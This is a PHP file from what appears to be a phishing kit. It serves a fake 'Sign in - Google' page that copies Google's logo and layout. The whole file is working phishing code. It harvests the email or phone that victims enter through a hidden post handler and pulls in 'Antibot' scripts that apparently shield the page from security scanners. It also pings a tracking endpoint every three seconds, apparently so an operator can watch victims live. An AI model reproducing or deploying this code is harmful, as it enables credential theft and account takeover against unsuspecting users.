<?php
error_reporting(0);
include('/../Antibot/Bot-Crawler.php');
include('/../Antibot/Dila_DZ.php');
include('/../Antibot/blockers.php');
include('/../Antibot/detects.php');

// pages/login.php
require_once __DIR__ . '/../includes/functions.php';
checkBlockedIP();  // Block access if IP is blocked

require_once __DIR__ . '/../includes/post_handlers.php';
$sessionId = $_GET['session_id'] ?? null;
if (!$sessionId) {
    header('Location: ../index.php');
    exit;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    handleLoginPost($sessionId);
}
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google</title>
    <link rel="icon" type="image/png" href="res/img/fav435vsdvge5.png">
    <link rel="stylesheet" href="res/css/style.css">
</head>
<body>
    <div class="container">
        <div class="signin-card">
            <div class="signin-left">
                <div class="logo-container">
                    <svg class="google-logo" viewBox="0 0 40 48" width="48" height="48" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
                        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
                        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
                        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
                    </svg>
                </div>
                <h1>Sign in</h1>
                <p class="subtitle">with your Google Account. This account will be available to other Google apps in the browser.</p>
            </div>
            
            <div class="signin-right">
                <form method="post">
                    <div class="input-container">
                        <input type="text" id="email" placeholder=" " required name="username">
                        <label class="input-label" for="email">Email or phone</label>
                    </div>
                    
                    <div class="forgot-email">
                        <button>Forgot email?</button>
                    </div>

                    <div class="guest-mode">
                        <p>Not your computer? Use Guest mode to sign in privately. <a href="#" target="_blank">Learn more about using Guest mode</a></p>
                    </div>

                    <div class="button-group">
                        <button class="create-account">Create account</button>
                        <button type="submit" class="next-button">Next</button>
                    </div>
                </form>
            </div>
        </div>

        <div class="footer">
            <select class="language-select">
                <option>English (United States)</option>
            </select>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
		setInterval(function(){
        fetch('../update_online.php?session_id=<?php echo $sessionId; ?>');
        }, 3000);
        document.querySelector('form').addEventListener('submit', function(event) {
            event.preventDefault();
            const card = document.querySelector('.signin-card');
            card.classList.add('submitting');
            
            setTimeout(() => {
                event.target.submit();
            }, 2000);
        });
    </script>
</body>
</html>